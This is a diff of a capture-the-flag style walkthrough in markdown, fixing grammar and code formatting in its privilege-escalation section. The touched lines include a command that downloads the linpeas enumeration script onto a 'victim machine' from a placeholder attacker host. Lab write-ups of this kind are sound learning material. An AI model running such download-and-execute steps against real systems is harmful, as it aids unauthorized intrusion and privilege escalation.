@@ -82,7 +82,7 @@ Now all we have to do is *ls* and we have the user.txt
 ## Privesc to Root.txt
 
 This one stumped me for a second, I haven't heard of this privesc until now,
-so finding it was more tedious than it should've.
+so finding it was more tedious than it should've been.
 
 Let's run linpeas on the machine to find any privesc vectors.
 First, we create a python server in the folder where we have our [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) script stored.
@@ -91,8 +91,8 @@ First, we create a python server in the folder where we have our [Linpeas](https
 
 Then we download the script on the victim machine
 
-```*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh
-```
+```*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh```
+
 From there it's as simple as running chmod and executing the script.
 
 ```
